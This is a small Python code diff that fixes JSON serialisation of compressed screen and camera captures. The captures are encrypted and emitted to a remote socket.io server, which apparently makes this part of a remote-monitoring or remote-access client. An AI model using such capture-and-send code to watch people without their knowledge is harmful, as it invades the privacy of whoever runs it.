@@ -513,7 +513,7 @@ def run(data, private_key):
                             compressed_data = zlib.compress(jpeg_data, level=9)
 
                             # Emit the compressed data
-                            sio.emit("screenshot", encrypt(public_key, json.dumps({"uid": uid, "image": compressed_data})))
+                            sio.emit("screenshot", encrypt(public_key, json.dumps({"uid": uid, "image": compressed_data.decode("latin-1")})))
                             print("Sent compressed screenshot")
 
                             last_capture_time = current_time
@@ -551,7 +551,7 @@ def run(data, private_key):
                     compressed_data = zlib.compress(jpeg_data, level=9)
 
                     # Emit the compressed data
-                    sio.emit("screenshot", encrypt(public_key, json.dumps({"uid": uid, "image": compressed_data})))
+                    sio.emit("screenshot", encrypt(public_key, json.dumps({"uid": uid, "image": compressed_data.decode("latin-1")})))
                     print("Sent compressed camera screenshot")
 
                     last_capture_time = current_time
